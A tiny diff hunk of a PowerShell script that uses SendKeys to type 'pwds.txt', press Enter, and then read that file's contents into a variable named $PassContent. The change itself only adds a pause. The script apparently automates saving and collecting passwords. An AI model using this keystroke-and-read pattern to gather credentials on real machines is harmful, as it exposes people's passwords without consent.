@@ -8,6 +8,7 @@ Sleep 1
 $wshell.SendKeys("pwds.txt")
 Sleep 1
 $wshell.SendKeys("~")
+Sleep 2
 
 $PassContent = Get-Content pwds.txt
 
